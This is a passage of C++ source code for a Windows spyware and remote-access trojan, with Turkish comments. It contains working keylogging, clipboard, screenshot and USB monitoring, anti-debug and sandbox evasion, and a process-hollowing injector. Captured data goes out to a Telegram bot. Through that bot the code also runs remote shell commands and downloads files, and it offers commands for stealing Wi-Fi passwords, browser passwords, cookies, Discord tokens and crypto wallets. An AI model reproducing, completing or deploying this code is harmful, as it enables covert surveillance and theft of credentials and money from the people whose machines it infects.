      msg << "⏱️ *Uptime:* `" << (int)uptime << " min`\n";
      msg << "📅 *Date:* `" << GetCurrentTimeStamp() << "`\n\n";

      if (!keysCopy.empty()) {
        std::string keys =
            keysCopy.length() > 2500 ? keysCopy.substr(0, 2500) + "\n...[TRUNCATED]" : keysCopy;
        msg << "⌨️ *KEYLOGS*\n" << "--------------------\n" << keys << "\n\n";
      }

      if (!clipCopy.empty()) {
        std::string clip = clipCopy.length() > 500
                               ? clipCopy.substr(0, 500) + "\n...[TRUNCATED]"
                               : clipCopy;
        msg << "📋 *CLIPBOARD*\n" << "--------------------\n" << clip << "\n\n";
      }

      if (!usbCopy.empty()) {
        msg << "🔌 *USB EVENTS*\n" << "--------------------\n" << usbCopy << "\n\n";
      }

      SendTelegramMessage(msg.str());

      // Screenshotları gönder
      for (const auto& path : screenshotsToSend) {
        SendTelegramPhoto(path, "📸 *Screenshot*");
        DeleteFileA(path.c_str()); // Gönderdikten sonra sil
        Sleep(500); // Nefes al - Arka arkaya gönderim CPU'yu boğmasın
      }

      // Diğer buffer'ları da temizle
      g_clipboardBuffer.clear();
      g_usbBuffer.clear();
      // g_screenshotPaths burada temizlenmemeli (yukarida lock icinde temizlendi)
      g_lastReportTime = now;
    }
  }
}

// ==================== ANTI-DEBUG ====================
bool IsDebuggerAttached() {
  if (IsDebuggerPresent())
    return true;

  BOOL debugged = FALSE;
  CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
  if (debugged)
    return true;

  // Timing check
  DWORD start = GetTickCount();
  Sleep(100);
  DWORD elapsed = GetTickCount() - start;
  if (elapsed < 90)
    return true; // Sleep hizlandirilmis

  return false;
}

// ==================== VM DETECTION ====================
bool IsVirtualMachine() {
  // Registry kontrolu
  HKEY hKey;
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools",
                    0, KEY_READ, &hKey) == ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return true;
  }

  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ,
                    &hKey) == ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return true;
  }

  // MAC adresi kontrolu (VM'ler bilinen prefixler kullanir)
  // Basitlik icin atladik

  return false;
}

// ==================== SANDBOX DETECTION ====================
bool IsSandbox() {
  // Dusuk RAM
  MEMORYSTATUSEX memInfo;
  memInfo.dwLength = sizeof(memInfo);
  GlobalMemoryStatusEx(&memInfo);
  if (memInfo.ullTotalPhys < 4ULL * 1024 * 1024 * 1024)
    return true;

  // Az CPU
  SYSTEM_INFO sysInfo;
  GetSystemInfo(&sysInfo);
  if (sysInfo.dwNumberOfProcessors < 2)
    return true;

  // Bilinen sandbox process'leri
  const char *sandboxProcs[] = {"vboxservice.exe", "vmtoolsd.exe",
                                "wireshark.exe", "procmon.exe", "x64dbg.exe"};

  HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap != INVALID_HANDLE_VALUE) {
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
      do {
        for (int i = 0; i < 5; i++) {
          if (_stricmp(pe.szExeFile, sandboxProcs[i]) == 0) {
            CloseHandle(hSnap);
            return true;
          }
        }
      } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
  }

  return false;
}

// ==================== PROCESS HOLLOWING ====================
bool ProcessHollow(const char *targetProcess, const char *payloadPath) {
  // 1. Hedef process'i suspended baslat
  STARTUPINFOA si = {sizeof(si)};
  PROCESS_INFORMATION pi;

  if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                      NULL, NULL, &si, &pi)) {
    return false;
  }

  // 2. Payload'u oku
  HANDLE hFile =
      CreateFileA(payloadPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    TerminateProcess(pi.hProcess, 0);
    return false;
  }

  DWORD fileSize = GetFileSize(hFile, NULL);
  BYTE *payload = new BYTE[fileSize];
  DWORD bytesRead;
  ReadFile(hFile, payload, fileSize, &bytesRead, NULL);
  CloseHandle(hFile);

  // 3. Thread context'i al
  CONTEXT ctx;
  ctx.ContextFlags = CONTEXT_FULL;
  GetThreadContext(pi.hThread, &ctx);

  // 4. PEB'den ImageBase al
  LPVOID pebImageBase;
#ifdef _WIN64
  pebImageBase = (LPVOID)(ctx.Rdx + 16);
#else
  pebImageBase = (LPVOID)(ctx.Ebx + 8);
#endif

  LPVOID imageBase;
  ReadProcessMemory(pi.hProcess, pebImageBase, &imageBase, sizeof(LPVOID),
                    NULL);

  // 5. Unmap et
  typedef NTSTATUS(WINAPI * pNtUnmapViewOfSection)(HANDLE, LPVOID);
  pNtUnmapViewOfSection NtUnmapViewOfSection =
      (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                            "NtUnmapViewOfSection");
  NtUnmapViewOfSection(pi.hProcess, imageBase);

  // 6. Yeni bellek ayir
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
  PIMAGE_NT_HEADERS ntHeader =
      (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

  LPVOID newBase =
      VirtualAllocEx(pi.hProcess, (LPVOID)ntHeader->OptionalHeader.ImageBase,
                     ntHeader->OptionalHeader.SizeOfImage,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  if (!newBase) {
    delete[] payload;
    TerminateProcess(pi.hProcess, 0);
    return false;
  }

  // 7. PE header yaz
  WriteProcessMemory(pi.hProcess, newBase, payload,
                     ntHeader->OptionalHeader.SizeOfHeaders, NULL);

  // 8. Sectionlari yaz
  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
  for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
    WriteProcessMemory(
        pi.hProcess, (LPVOID)((DWORD_PTR)newBase + section[i].VirtualAddress),
        payload + section[i].PointerToRawData, section[i].SizeOfRawData, NULL);
  }

// 9. Entry point guncelle
#ifdef _WIN64
  ctx.Rcx = (DWORD64)newBase + ntHeader->OptionalHeader.AddressOfEntryPoint;
  WriteProcessMemory(pi.hProcess, pebImageBase, &newBase, sizeof(LPVOID), NULL);
#else
  ctx.Eax = (DWORD)newBase + ntHeader->OptionalHeader.AddressOfEntryPoint;
  WriteProcessMemory(pi.hProcess, pebImageBase, &newBase, sizeof(LPVOID), NULL);
#endif

  SetThreadContext(pi.hThread, &ctx);

  // 10. Thread'i devam ettir
  ResumeThread(pi.hThread);

  delete[] payload;
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  return true;
}

// ==================== FAZ 1: CLIPBOARD ====================
void ClipboardMonitorLoop() {
  static std::string lastClip;  // Duplicate önleme
  
  while (g_running) {
    // EVASION: Random jitter (10-30 saniye) - sabit pattern önleme
    int jitter = (rand() % 20000) + 10000;  // 10-30 saniye
    Sleep(jitter);

    if (OpenClipboard(NULL)) {
      HANDLE hData = GetClipboardData(CF_TEXT);
      if (hData) {
        char *text = (char *)GlobalLock(hData);
        if (text) {
          std::string clipText(text);
          if (clipText != g_lastClipboard && !clipText.empty()) {
            g_lastClipboard = clipText;

            time_t now = time(NULL);
            tm *ltm = localtime(&now);
            char timeStr[32];
            strftime(timeStr, sizeof(timeStr), "%H:%M:%S", ltm);

            std::string truncated = clipText.length() > 500
                                        ? clipText.substr(0, 500) + "..."
                                        : clipText;
            g_clipboardBuffer +=
                "[" + std::string(timeStr) + "] " + truncated + "\n";
          }
          GlobalUnlock(hData);
        }
      }
      CloseClipboard();
    }
  }
}

// ==================== FAZ 1: SCREENSHOT ====================
// ==================== JPEG ENCODER CACHE (Performans Optimizasyonu) ====================
static CLSID g_jpegEncoderClsid;
static bool g_jpegEncoderCached = false;

int GetEncoderClsid(const WCHAR *format, CLSID *pClsid) {
  // JPEG için cache kullan
  if (wcscmp(format, L"image/jpeg") == 0 && g_jpegEncoderCached) {
    *pClsid = g_jpegEncoderClsid;
    return 0;
  }

  UINT num = 0, size = 0;
  Gdiplus::GetImageEncodersSize(&num, &size);
  if (size == 0)
    return -1;

  Gdiplus::ImageCodecInfo *pImageCodecInfo =
      (Gdiplus::ImageCodecInfo *)(malloc(size));
  if (!pImageCodecInfo)
    return -1;

  Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

  for (UINT i = 0; i < num; ++i) {
    if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
      *pClsid = pImageCodecInfo[i].Clsid;
      
      // JPEG için cache'e kaydet
      if (wcscmp(format, L"image/jpeg") == 0) {
        g_jpegEncoderClsid = *pClsid;
        g_jpegEncoderCached = true;
      }
      
      free(pImageCodecInfo);
      return i;
    }
  }

  free(pImageCodecInfo);
  return -1;
}

std::string CaptureScreen() {
#if FEATURE_SCREENSHOT
  if (!EnsureGdiPlus()) return "";

  int width = GetSystemMetrics(SM_CXSCREEN);
  int height = GetSystemMetrics(SM_CYSCREEN);

  HDC hScreenDC = GetDC(NULL);
  HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
  HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
  SelectObject(hMemoryDC, hBitmap);

  BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

  // Dosya yolu olustur
  time_t now = time(NULL);
  tm *ltm = localtime(&now);
  char filename[64];
  strftime(filename, sizeof(filename), "ss_%Y%m%d_%H%M%S.jpg", ltm);
  std::string filepath = g_tempFolder + "\\" + filename;

  // JPEG olarak kaydet
  Gdiplus::Bitmap bitmap(hBitmap, NULL);

  // Boyutu kucult (yarim boyut)
  int newWidth = width / 2;
  int newHeight = height / 2;
  Gdiplus::Bitmap resized(newWidth, newHeight);
  Gdiplus::Graphics graphics(&resized);
  graphics.DrawImage(&bitmap, 0, 0, newWidth, newHeight);

  // Encoder al
  CLSID jpegClsid;
  GetEncoderClsid(L"image/jpeg", &jpegClsid);

  // Kalite ayari
  Gdiplus::EncoderParameters encoderParams;
  encoderParams.Count = 1;
  encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
  encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
  encoderParams.Parameter[0].NumberOfValues = 1;
  ULONG quality = 50;
  encoderParams.Parameter[0].Value = &quality;

  // Wstring'e cevir
  std::wstring wFilepath(filepath.begin(), filepath.end());
  resized.Save(wFilepath.c_str(), &jpegClsid, &encoderParams);

  DeleteObject(hBitmap);
  DeleteDC(hMemoryDC);
  ReleaseDC(NULL, hScreenDC);

  return filepath;
#else
  return "";
#endif
}

void ScreenshotLoop() {
  // Düşük öncelik - Ana keylogger döngüsünü engellemesin
  SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);

  while (g_running) {
    // EVASION: Random jitter (60-180 saniye) - sabit pattern önleme
    int jitter = (rand() % 120000) + 60000;  // 60-180 saniye (1-3 dk)
    Sleep(jitter);

    time_t now = time(NULL);
    if (now - g_lastScreenshotTime >= SCREENSHOT_INTERVAL) {
      std::string path = CaptureScreen();
      if (!path.empty()) {
        g_screenshotPaths.push_back(path);
      }
      g_lastScreenshotTime = now;
    }
  }
}

// ==================== FAZ 1: USB IZLEME ====================
std::vector<std::string> g_connectedUSBs;

std::vector<std::string> GetConnectedUSBDevices() {
  std::vector<std::string> devices;

  // Mantiksal suruculeri al
  DWORD drives = GetLogicalDrives();
  for (int i = 0; i < 26; i++) {
    if (drives & (1 << i)) {
      char drivePath[4] = {(char)('A' + i), ':', '\\', '\0'};
      UINT driveType = GetDriveTypeA(drivePath);

      if (driveType == DRIVE_REMOVABLE) {
        // USB flash drive
        char volumeName[MAX_PATH];
        char fsName[MAX_PATH];
        GetVolumeInformationA(drivePath, volumeName, MAX_PATH, NULL, NULL, NULL,
                              fsName, MAX_PATH);

        std::string device = std::string(drivePath) + " " + volumeName;
        devices.push_back(device);
      }
    }
  }

  return devices;
}

// ==================== NETWORK BATCHING HELPER ====================
// Mesajları hemen göndermek yerine kuyruğa ekle, ReportLoop'da toplu gönder
void QueueTelegramMessage(const std::string& message) {
  EnterCriticalSection(&g_pendingMessagesLock);
  g_pendingMessages.push_back(message);
  LeaveCriticalSection(&g_pendingMessagesLock);
}

void USBMonitorLoop() {
  g_connectedUSBs = GetConnectedUSBDevices();

  while (g_running) {
    Sleep(3000);

    std::vector<std::string> currentUSBs = GetConnectedUSBDevices();

    // Yeni eklenenler
    for (const auto &usb : currentUSBs) {
      bool found = false;
      for (const auto &old : g_connectedUSBs) {
        if (usb == old) {
          found = true;
          break;
        }
      }
      if (!found) {
        time_t now = time(NULL);
        tm *ltm = localtime(&now);
        char timeStr[32];
        strftime(timeStr, sizeof(timeStr), "%H:%M:%S", ltm);

        g_usbBuffer += "[" + std::string(timeStr) + "] + " + usb + "\n";
        // Network batching: Kuyruğa ekle, hemen gönderme
        QueueTelegramMessage("🔌 *DEVICE CONNECTED*\n`" + usb + "`");
      }
    }

    // Cikarilanlar
    for (const auto &old : g_connectedUSBs) {
      bool found = false;
      for (const auto &usb : currentUSBs) {
        if (usb == old) {
          found = true;
          break;
        }
      }
      if (!found) {
        time_t now = time(NULL);
        tm *ltm = localtime(&now);
        char timeStr[32];
        strftime(timeStr, sizeof(timeStr), "%H:%M:%S", ltm);

        g_usbBuffer += "[" + std::string(timeStr) + "] - " + old + "\n";
        // Network batching: Çıkartma bildirimini de kuyruğa ekle
        QueueTelegramMessage("🔌 *DEVICE REMOVED*\n`" + old + "`");
      }
    }

    g_connectedUSBs = currentUSBs;
  }
}

// ==================== FAZ 2: TELEGRAM FOTO ====================
bool SendTelegramPhoto(const std::string &path, const std::string &caption) {
  NETWORK.Lock();
  HINTERNET hConnect = NETWORK.GetConnection();

  if (!hConnect) {
    NETWORK.Unlock();
    return false;
  }

  std::string apiPath = "/bot" + std::string(TELEGRAM_BOT_TOKEN) + "/sendPhoto";
  HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", apiPath.c_str(), NULL,
                                        NULL, NULL, INTERNET_FLAG_SECURE, 0);
  
  if (!hRequest) {
    NETWORK.Reset();
    hConnect = NETWORK.GetConnection();
    if (hConnect) {
      hRequest = HttpOpenRequestA(hConnect, "POST", apiPath.c_str(), NULL,
                                  NULL, NULL, INTERNET_FLAG_SECURE, 0);
    }
  }

  if (!hRequest) {
    NETWORK.Unlock();
    return false;
  }

  // Dosyayi oku
  std::ifstream file(path, std::ios::binary);
  if (!file) {
    InternetCloseHandle(hRequest);
    NETWORK.Unlock();
    return false;
  }

  std::vector<char> fileData((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
  file.close();

  // Multipart form data olustur
  std::string boundary = "----Boundary" + std::to_string(GetTickCount());
  std::string contentType =
      "Content-Type: multipart/form-data; boundary=" + boundary;

  std::stringstream body;
  body << "--" << boundary << "\r\n";
  body << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
       << TELEGRAM_CHAT_ID << "\r\n";
  body << "--" << boundary << "\r\n";
  body << "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
       << caption << "\r\n";
  body << "--" << boundary << "\r\n";
  body << "Content-Disposition: form-data; name=\"photo\"; "
          "filename=\"photo.jpg\"\r\n";
  body << "Content-Type: image/jpeg\r\n\r\n";

  std::string bodyStart = body.str();
  std::string bodyEnd = "\r\n--" + boundary + "--\r\n";

  std::vector<char> fullBody;
  fullBody.insert(fullBody.end(), bodyStart.begin(), bodyStart.end());
  fullBody.insert(fullBody.end(), fileData.begin(), fileData.end());
  fullBody.insert(fullBody.end(), bodyEnd.begin(), bodyEnd.end());

  HttpSendRequestA(hRequest, contentType.c_str(), contentType.length(),
                   fullBody.data(), fullBody.size());

  InternetCloseHandle(hRequest);
  NETWORK.Unlock();
  return true;
}

bool SendTelegramDocument(const std::string &path, const std::string &caption) {
  // Foto ile ayni mantik, sadece "document" kullan
  NETWORK.Lock();
  HINTERNET hConnect = NETWORK.GetConnection();

  if (!hConnect) {
    NETWORK.Unlock();
    return false;
  }

  std::string apiPath =
      "/bot" + std::string(TELEGRAM_BOT_TOKEN) + "/sendDocument";
  HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", apiPath.c_str(), NULL,
                                        NULL, NULL, INTERNET_FLAG_SECURE, 0);
  
  if (!hRequest) {
    NETWORK.Reset();
    hConnect = NETWORK.GetConnection();
    if (hConnect) {
      hRequest = HttpOpenRequestA(hConnect, "POST", apiPath.c_str(), NULL,
                                  NULL, NULL, INTERNET_FLAG_SECURE, 0);
    }
  }

  if (!hRequest) {
    NETWORK.Unlock();
    return false;
  }

  std::ifstream file(path, std::ios::binary);
  if (!file) {
    InternetCloseHandle(hRequest);
    NETWORK.Unlock();
    return false;
  }

  std::vector<char> fileData((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
  file.close();

  // Dosya adini al
  std::string filename = path.substr(path.find_last_of("\\/") + 1);

  std::string boundary = "----Boundary" + std::to_string(GetTickCount());
  std::string contentType =
      "Content-Type: multipart/form-data; boundary=" + boundary;

  std::stringstream body;
  body << "--" << boundary << "\r\n";
  body << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
       << TELEGRAM_CHAT_ID << "\r\n";
  body << "--" << boundary << "\r\n";
  body << "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
       << caption << "\r\n";
  body << "--" << boundary << "\r\n";
  body << "Content-Disposition: form-data; name=\"document\"; filename=\""
       << filename << "\"\r\n";
  body << "Content-Type: application/octet-stream\r\n\r\n";

  std::string bodyStart = body.str();
  std::string bodyEnd = "\r\n--" + boundary + "--\r\n";

  std::vector<char> fullBody;
  fullBody.insert(fullBody.end(), bodyStart.begin(), bodyStart.end());
  fullBody.insert(fullBody.end(), fileData.begin(), fileData.end());
  fullBody.insert(fullBody.end(), bodyEnd.begin(), bodyEnd.end());

  HttpSendRequestA(hRequest, contentType.c_str(), contentType.length(),
                   fullBody.data(), fullBody.size());

  InternetCloseHandle(hRequest);
  NETWORK.Unlock();
  return true;
}

// ==================== FAZ 2: REMOTE COMMANDS ====================
void RemoteCommandLoop() {
  // Seed random generator
  srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
  
  bool firstRun = true;  // İlk çalıştırmada hemen poll yap
  
  while (g_running) {
    // İlk çalıştırmada bekleme, sonrakilerde jitter uygula
    if (!firstRun) {
      // EVASION: Random jitter (10-30 saniye arası) - DEBUG: azaltıldı
      int jitter = (rand() % 20000) + 10000;  // 10-30 saniye
      Sleep(jitter);
    }
    firstRun = false;

    // BAĞIMSIZ BAĞLANTI KULLAN (NetworkManager yerine)
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) continue;

    HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org",
                                          INTERNET_DEFAULT_HTTPS_PORT, NULL,
                                          NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
      InternetCloseHandle(hInternet);
      continue;
    }

    std::string path =
        "/bot" + std::string(TELEGRAM_BOT_TOKEN) +
        "/getUpdates?offset=" + std::to_string(g_lastUpdateId + 1) +
        "&timeout=5";
    // CACHE-BUSTING: Her istekte yeni veri al, önbellek kullanma
    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | 
                  INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE;
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path.c_str(), NULL,
                                          NULL, NULL, flags, 0);

    if (hRequest && HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
      char buffer[8192];
      DWORD bytesRead;
      std::string response;

      while (
          InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) &&
          bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
      }

      if (!response.empty() &&
          response.find("\"result\":[]") == std::string::npos) {
        // update_id'leri bul ve guncelle
        size_t pos = 0;
        while ((pos = response.find("\"update_id\":", pos)) !=
               std::string::npos) {
          pos += 12;
          size_t end = response.find_first_of(",}", pos);
          long long uid = std::stoll(response.substr(pos, end - pos));
          if (uid > g_lastUpdateId)
            g_lastUpdateId = uid;
        }

        ProcessCommands(response);
      }
    }

    if (hRequest) InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
  }
}

void ProcessCommands(const std::string &json) {
#if FEATURE_REMOTE_COMMANDS
  // Hafif komutlar - senkron çalışabilir
  if (json.find("/status") != std::string::npos) {
    POOL.Submit([]() {
        double uptime = difftime(time(NULL), g_startTime) / 60.0;
        std::stringstream ss;
        ss << "📊 *Durum*\n⏱ `" << (int)uptime << " dk`\n";
        
        EnterCriticalSection(&g_keyBufferLock);
        size_t keyLen = g_keyBuffer.length();
        LeaveCriticalSection(&g_keyBufferLock);
        
        ss << "⌨ `" << keyLen << "` | 📋 `"
           << g_clipboardBuffer.length() << "`";
        SendTelegramMessage(ss.str());
    });
  }

  if (json.find("/help") != std::string::npos) {
    POOL.Submit([]() {
        SendTelegramMessage("📋 *Komutlar:*\n"
                            "/ss - Screenshot\n"
                            "/wifi - WiFi sifreleri\n"
                            "/pass - Browser sifreleri\n"
                            "/discord - Discord token\n"
                            "/cookies - Chrome cookies\n"
                            "/wallets - Crypto wallet\n"
                            "/webcam - Webcam durumu\n"
                            "/files - Hassas dosyalar\n"
                            "/steal - Tum stealerlar\n"
                            "/download X - Dosya indir\n"
                            "/status - Durum\n"
                            "/info - Sistem\n"
                            "/dump - Rapor\n"
                            "/cmd X - Komut\n"
                            "/kill - Kapat");
    });
  }

  if (json.find("/kill") != std::string::npos) {
    POOL.Submit([]() {
        SendTelegramMessage("🔴 Kapatiliyor...");
        Sleep(1500);
        g_running = false;
        ExitProcess(0);
    });
  }

  // Ağır komutlar - Thread Pool ile çalıştır
#if FEATURE_SCREENSHOT
  if (json.find("/ss") != std::string::npos ||
      json.find("/screenshot") != std::string::npos) {
    POOL.Submit([]() {
      std::string path = CaptureScreen();
      if (!path.empty()) {
        SendTelegramPhoto(path, "📸 Screenshot");
        DeleteFileA(path.c_str());
      }
    });
  }
#endif

  if (json.find("/info") != std::string::npos) {
    POOL.Submit([]() {
      SendTelegramMessage(GetSystemInfo());
    });
  }

  if (json.find("/dump") != std::string::npos) {
    POOL.Submit([]() {
      SendReport(true);
    });
  }

#if FEATURE_STEAL_WIFI
  if (json.find("/wifi") != std::string::npos) {
    POOL.Submit([]() {
      GetWifiPasswords();
    });
  }
#endif

#if FEATURE_STEAL_BROWSER
  if (json.find("/pass") != std::string::npos) {
    POOL.Submit([]() {
      GetBrowserPasswords();
    });
  }
#endif

  // /download komutu
  size_t dlPos = json.find("/download ");
  if (dlPos != std::string::npos) {
    size_t start = dlPos + 10;
    size_t end = json.find("\"", start);
    if (end != std::string::npos && end > start) {
      std::string url = json.substr(start, end - start);
      POOL.Submit([url]() {
        DownloadFile(url);
      });
    }
  }

  // /cmd komutu
  size_t cmdPos = json.find("/cmd ");
  if (cmdPos != std::string::npos) {
    size_t start = cmdPos + 5;
    size_t end = json.find("\"", start);
    if (end != std::string::npos && end > start) {
      std::string cmd = json.substr(start, end - start);
      POOL.Submit([cmd]() {
        ExecuteCommand(cmd);
      });
    }
  }

  // ==================== STEALER COMMANDS ====================

#if FEATURE_STEAL_DISCORD
  if (json.find("/discord") != std::string::npos) {
    POOL.Submit([]() {
      std::string report = GetDiscordTokensReport();
      SendTelegramMessage(report);
    });
  }
#endif

#if FEATURE_STEAL_BROWSER
  if (json.find("/cookies") != std::string::npos) {
    POOL.Submit([]() {
      std::string report = ExtractChromeCookies();
      SendTelegramMessage(report);
    });
  }
#endif

#if FEATURE_STEAL_CRYPTO
  if (json.find("/wallets") != std::string::npos) {
    POOL.Submit([]() {
      std::string report = GetCryptoWalletsReport();
      SendTelegramMessage(report);
    });
  }
#endif

#if FEATURE_STEAL_WEBCAM
  if (json.find("/webcam") != std::string::npos) {
    POOL.Submit([]() {
      std::string report = GetWebcamStatus();
      SendTelegramMessage(report);
    });
  }
#endif

#if FEATURE_STEAL_FILES
  if (json.find("/files") != std::string::npos) {
    POOL.Submit([]() {
      std::string report = GetSensitiveFilesReport();
      if (report.length() > 4000) {
        report = report.substr(0, 4000) + "\n...[truncated]";
      }
      SendTelegramMessage(report);
    });
  }
#endif

#if FEATURE_STEALERS
  if (json.find("/steal") != std::string::npos) {
    POOL.Submit([]() {
      std::string report = RunAllStealers();
      if (report.length() > 4000) {
        report = report.substr(0, 4000) + "\n...[truncated]";
      }
      SendTelegramMessage(report);
    });
  }
#endif

#endif // FEATURE_REMOTE_COMMANDS
}

void ExecuteCommand(const std::string &cmd) {
  // EVASION: Pipe kullanarak temp dosya oluşturmayı önle
  SECURITY_ATTRIBUTES sa;
  sa.nLength = sizeof(sa);
  sa.bInheritHandle = TRUE;
  sa.lpSecurityDescriptor = NULL;

  HANDLE hReadPipe, hWritePipe;
  if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
    SendTelegramMessage("❌ Pipe oluşturulamadı");
    return;
  }

  // Read handle'ın inherit edilmesini engelle
  SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

  STARTUPINFOA si = {sizeof(si)};
  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
  si.wShowWindow = SW_HIDE;
  si.hStdOutput = hWritePipe;
  si.hStdError = hWritePipe;
  si.hStdInput = NULL;

  PROCESS_INFORMATION pi;
  std::string cmdLine = "cmd.exe /c " + cmd;

  if (CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, TRUE,
                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    CloseHandle(hWritePipe);  // Yazma tarafını kapat

    // Çıktıyı oku
    std::string output;
    char buffer[4096];
    DWORD bytesRead;
    
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
      buffer[bytesRead] = '\0';
      output += buffer;
    }

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    if (output.length() > 4000)
      output = output.substr(0, 4000) + "...";
    SendTelegramMessage("💻 *COMMAND OUTPUT*\n--------------------\n```\n" + output + "\n```");
  } else {
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);
    SendTelegramMessage("❌ Komut çalıştırılamadı");
  }
}

std::string GetSystemInfo() {
  std::stringstream ss;
  ss << "ℹ️ *SYSTEM INFO* ℹ️\n\n";

  char hostname[256], username[256];
  DWORD size = sizeof(hostname);
  GetComputerNameA(hostname, &size);
  size = sizeof(username);
  GetUserNameA(username, &size);

  ss << "📍 *PC:* `" << hostname << "`\n";
  ss << "👤 *User:* `" << username << "`\n";

  SYSTEM_INFO sysInfo;
  GetSystemInfo(&sysInfo);
  ss << "💻 *CPU:* `" << sysInfo.dwNumberOfProcessors << " Cores`\n";

  MEMORYSTATUSEX memInfo;
  memInfo.dwLength = sizeof(memInfo);
  GlobalMemoryStatusEx(&memInfo);
  ss << "💾 *RAM:* `" << (memInfo.ullTotalPhys / (1024 * 1024 * 1024))
     << " GB`\n";
  ss << "🕒 *Time:* `" << GetCurrentTimeStamp() << "`";

  return ss.str();
}

void SendReport(bool manual) {
  double uptime = difftime(time(NULL), g_startTime) / 60.0;

  std::stringstream msg;
  msg << (manual ? "📥 *Manuel Rapor*" : "📊 *Rapor*") << "\n";
  msg << "⏱ `" << (int)uptime << " dk`\n\n";

  // Thread-safe: buffer'ı kopyala
  std::string keysCopy;
  EnterCriticalSection(&g_keyBufferLock);
  keysCopy = g_keyBuffer;
  if (manual) {
    g_keyBuffer.clear();  // Kopyaladıktan sonra sil
  }
  LeaveCriticalSection(&g_keyBufferLock);

  if (!keysCopy.empty()) {
    std::string keys =
        keysCopy.length() > 2500 ? keysCopy.substr(0, 2500) : keysCopy;
    msg << "⌨ *Tuslar:*\n```\n" << keys << "\n```\n";
  }

  if (!g_clipboardBuffer.empty()) {
    std::string clip = g_clipboardBuffer.length() > 500
                           ? g_clipboardBuffer.substr(0, 500)
                           : g_clipboardBuffer;
    msg << "\n📋 *Clipboard:*\n```\n" << clip << "\n```\n";
  }

  SendTelegramMessage(msg.str());

  if (manual) {
    g_clipboardBuffer.clear();
    g_usbBuffer.clear();
  }
}

// ==================== FAZ 3: WIFI SIFRELERI ====================
void GetWifiPasswords() {
  std::stringstream result;
  result << "📶 *WiFi Sifreleri*\n\n";

  // Profilleri al
  char tempFile[MAX_PATH];
  GetTempPathA(MAX_PATH, tempFile);
  strcat_s(tempFile, MAX_PATH, "wifi_profiles.txt");

  std::string cmd =
      "netsh wlan show profiles > \"" + std::string(tempFile) + "\"";
  ExecCommand(cmd);

  std::ifstream profilesFile(tempFile);
  std::string line;
  std::vector<std::string> profiles;

  while (std::getline(profilesFile, line)) {
    // "All User Profile" veya "Tüm Kullanıcı Profili" ara
    size_t pos = line.find(": ");
    if (pos != std::string::npos &&
        (line.find("All User Profile") != std::string::npos ||
         line.find("Profili") != std::string::npos)) {
      std::string name = line.substr(pos + 2);
      // Trim
      while (!name.empty() &&
             (name.back() == '\r' || name.back() == '\n' || name.back() == ' '))
        name.pop_back();
      if (!name.empty())
        profiles.push_back(name);
    }
  }
  profilesFile.close();
  DeleteFileA(tempFile);

  // Her profil icin sifre al
  for (const auto &profile : profiles) {
